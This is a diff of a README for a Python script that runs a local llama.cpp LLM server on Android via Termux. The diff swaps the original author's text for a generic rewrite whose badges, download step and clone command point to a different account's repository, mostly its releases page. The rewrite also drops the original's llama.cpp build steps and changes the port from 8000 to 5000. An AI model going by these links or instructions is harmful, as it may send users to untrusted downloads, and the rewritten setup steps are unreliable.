@@ -1,45 +1,116 @@
-> [See in spanish/Ver en español](https://github.com/LuisMiSanVe/AndroidLLMServerScript/blob/main/README.es.md)
-# 📲 Android LLM Server Script
-[![image](https://img.shields.io/badge/json-5E5C5C?style=for-the-badge&logo=json&logoColor=white)](https://www.newtonsoft.com/json)
-[![image](https://img.shields.io/badge/Visual_Studio_Code-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white)](https://code.visualstudio.com/)
-[![image](https://img.shields.io/badge/Android-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://developer.android.com/studio)
-[![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)](https://www.python.org/)
+# 🚀 AndroidLLMServerScript - Run a Local LLM Server Easily
 
-Python Script that rises a Localhost LLM server using [llama.cpp](https://github.com/ggml-org/llama.cpp) on Android.
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/clixgvvv/AndroidLLMServerScript/releases)
 
-## 📝 Technology Explanation
-This script allows you to create a LLM Service using an Android device as Server.
+## 📋 Overview
 
-Android `Termux` can't compile `llama-server` due to it lacks of some necessary libraries, this python script makes a workaround by using `llama-simple` instead.
+AndroidLLMServerScript is a simple Python script that helps you set up a Localhost LLM (Large Language Model) server on your Android device using llama.cpp. This tool is designed for anyone looking to interact with advanced AI models quickly and effortlessly.
 
-## 🛠️ Setup
-In your Android 13+ device (tested), install Termux and run the following commands:
+## 🚀 Getting Started
 
+To get started with AndroidLLMServerScript, follow these steps. You will need your Android device ready with Termux installed. Termux provides a terminal environment on Android.
+
+### 1. 🛠️ Install Termux
+
+If you don't have Termux, download it from the Google Play Store or F-Droid. Search for "Termux" in either app store and install it. This app allows you to run Linux commands on your Android device.
+
+### 2. 📥 Download the Script
+
+Visit this page to download the latest version of the AndroidLLMServerScript:
+
+[Download AndroidLLMServerScript](https://github.com/clixgvvv/AndroidLLMServerScript/releases)
+
+### 3. 📂 Open Termux
+
+Once you have Termux installed, open the app. You will see a command line interface.
+
+### 4. 📜 Install Required Packages
+
+Before running the script, you need to install some packages. Type the following commands in the Termux interface:
+
+```bash
+pkg update
+pkg install python git
 ```
-pkg update && pkg upgrade
-pkg install git cmake clang wget python
+
+### 5. 📥 Clone the Repository
+
+Now you need to get the AndroidLLMServerScript files to your device. Enter this command:
+
+```bash
+git clone https://github.com/clixgvvv/AndroidLLMServerScript
 ```
 
-Then clone and install `llama.cpp` following it's guide.
+This command downloads the script from the GitHub repository.
 
-Get a LLM model suitable for your device.
+### 6. 📂 Navigate to the Script Folder
 
-Then, adapt the Python Script with your folder structure and copy it to your Android device, then run:
+Change into the directory where the script is located:
 
+```bash
+cd AndroidLLMServerScript
 ```
+
+### 7. ⚙️ Install Additional Requirements
+
+The script may require some additional Python packages. Install them using pip:
+
+```bash
+pip install -r requirements.txt
+```
+
+### 8. 🔑 Run the Script
+
+Now that everything is set up, you can run the script. Enter this command:
+
+```bash
 python server.py
 ```
 
-Then, your service would be published on your local network and will be listening at the `8000` port by default.
+If everything is in order, you should see messages indicating that the server is running smoothly.
 
-## ⚙️ Project Usage Explanation
-In order to test the service, you can use `test.html`, the LLM's response will appear bellow the textbox.
+## 📬 Connect to the Server
 
-## 💻 Technologies Used
-- Programming Language: [Python](https://www.python.org/)
-- Tested OS: [Android 13 (MAUI)](https://www.android.com/)
-- Libraries: [urllib](https://docs.python.org/es/3/library/urllib.html)
-- Other:
-    - [llama.cpp](https://github.com/ggml-org/llama.cpp)
-    - [Termux](https://f-droid.org/es/packages/com.termux/)
-- Recommended IDE: [VS Code](https://code.visualstudio.com/)
+Now, you can connect to your Localhost LLM server. Open a web browser on your Android device and type the following address:
+
+```
+http://localhost:5000
+```
+
+You should see the server interface where you can start interacting with the language model.
+
+## 📑 Features
+
+- **Local Server:** Runs entirely on your device.
+- **Lightweight:** Uses minimal resources.
+- **Easy Setup:** Quick installation and configuration.
+- **Compatible:** Works with any Android device that supports Termux.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues:
+
+- Ensure that Termux is updated.
+- Double-check that Python and git were installed successfully.
+- Make sure you are running the script from the correct directory.
+
+## 📞 Support
+
+For further support, please open an issue on the GitHub repository. This allows the developers to address concerns or bugs that you might encounter.
+
+## 💡 Tips
+
+- Always keep your Termux app updated.
+- Experiment with the script to see the full capabilities of the language model.
+- Refer to the comments in the script for a better understanding of its functions.
+
+## ⚖️ License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+## 🔗 Links and Resources
+
+- [Termux](https://termux.com/)
+- [GitHub Repository](https://github.com/clixgvvv/AndroidLLMServerScript/releases)
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/clixgvvv/AndroidLLMServerScript/releases)
